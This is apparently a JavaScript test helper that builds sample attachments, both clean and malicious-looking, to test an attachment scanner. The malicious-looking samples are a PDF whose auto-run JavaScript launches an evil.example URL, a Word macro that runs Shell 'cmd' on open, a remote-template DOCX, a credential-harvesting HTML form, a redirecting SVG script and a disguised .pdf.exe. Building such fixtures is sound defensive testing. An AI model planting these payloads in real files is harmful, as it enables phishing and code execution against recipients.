// Builds real sample files for the attachment tests (no fixtures checked in)
const zlib = require('zlib');
function zip(files, { encrypted = [] } = {}) {
  const locals = [], centrals = []; let off = 0;
  for (const [name, content] of Object.entries(files)) {
    const data = Buffer.from(content), comp = zlib.deflateRawSync(data), nm = Buffer.from(name), crc = zlib.crc32(data);
    const flag = encrypted.includes(name) ? 1 : 0;
    const lh = Buffer.alloc(30); lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4); lh.writeUInt16LE(flag, 6); lh.writeUInt16LE(8, 8);
    lh.writeUInt32LE(crc, 14); lh.writeUInt32LE(comp.length, 18); lh.writeUInt32LE(data.length, 22); lh.writeUInt16LE(nm.length, 26);
    const ch = Buffer.alloc(46); ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(20, 4); ch.writeUInt16LE(20, 6); ch.writeUInt16LE(flag, 8); ch.writeUInt16LE(8, 10);
    ch.writeUInt32LE(crc, 16); ch.writeUInt32LE(comp.length, 20); ch.writeUInt32LE(data.length, 24); ch.writeUInt16LE(nm.length, 28); ch.writeUInt32LE(off, 42);
    locals.push(lh, nm, comp); centrals.push(ch, nm); off += 30 + nm.length + comp.length;
  }
  const cd = Buffer.concat(centrals), end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(Object.keys(files).length, 8); end.writeUInt16LE(Object.keys(files).length, 10);
  end.writeUInt32LE(cd.length, 12); end.writeUInt32LE(off, 16);
  return Buffer.concat([...locals, cd, end]);
}
const CT = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>';
const files = {
  pdfAutoJs: () => Buffer.from('%PDF-1.4\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj\n2 0 obj << /S /JavaScript /JS (app.launchURL("http://evil.example/x")) >> endobj\n%%EOF'),
  pdfHiddenLink: () => { const inner = zlib.deflateSync(Buffer.from('<< /A << /S /URI /URI (http://paypa1-verify.co/login) >> >>'));
    return Buffer.concat([Buffer.from('%PDF-1.5\n3 0 obj << /Length ' + inner.length + ' /Filter /FlateDecode >>\nstream\n'), inner, Buffer.from('\nendstream endobj\n%%EOF')]); },
  pdfClean: () => Buffer.from('%PDF-1.4\n1 0 obj << /Type /Catalog >> endobj\nBT (School timetable) Tj ET\n%%EOF'),
  docmAutoMacro: () => zip({ '[Content_Types].xml': CT, 'word/document.xml': '<w:document/>', 'word/vbaProject.bin': 'Attribute VB_Name = "x"\nSub AutoOpen()\nShell "cmd"\nEnd Sub' }),
  docxRemoteTemplate: () => zip({ '[Content_Types].xml': CT, 'word/document.xml': '<w:document/>',
    'word/_rels/settings.xml.rels': '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://203.0.113.5/t.dotm" TargetMode="External"/></Relationships>' }),
  docxClean: () => zip({ '[Content_Types].xml': CT, 'word/document.xml': '<w:document><w:t>Meeting notes</w:t></w:document>' }),
  zipWithExe: () => zip({ 'invoice/Invoice_2026.pdf.exe': 'MZ fake program', 'readme.txt': 'hi' }),
  zipLocked: () => zip({ 'scan.pdf': '%PDF-1.4' }, { encrypted: ['scan.pdf'] }),
  zipClean: () => zip({ 'photos/trip.jpg': 'jpg', 'notes.txt': 'notes' }),
  htmlLogin: () => Buffer.from('<!doctype html><html><body><form action="https://collect.example/p"><input type="email"><input type="password"></form></body></html>'),
  svgScript: () => Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>window.location="https://evil.example"</script></svg>'),
  exeAsPdf: () => Buffer.concat([Buffer.from('MZ'), Buffer.alloc(200, 1)]),
  oleMacro: () => Buffer.concat([Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), Buffer.from('_VBA_PROJECT', 'utf16le'), Buffer.from(' Sub Document_Open() ')]),
  qrPng: async (text) => require('qrcode').toBuffer(text, { type: 'png', margin: 2, width: 300 }),
  qrJpeg: async (text) => { const png = require('pngjs').PNG.sync.read(await require('qrcode').toBuffer(text, { type: 'png', margin: 2, width: 300 }));
    return require('jpeg-js').encode({ data: png.data, width: png.width, height: png.height }, 90).data; },
};
module.exports = { zip, files };
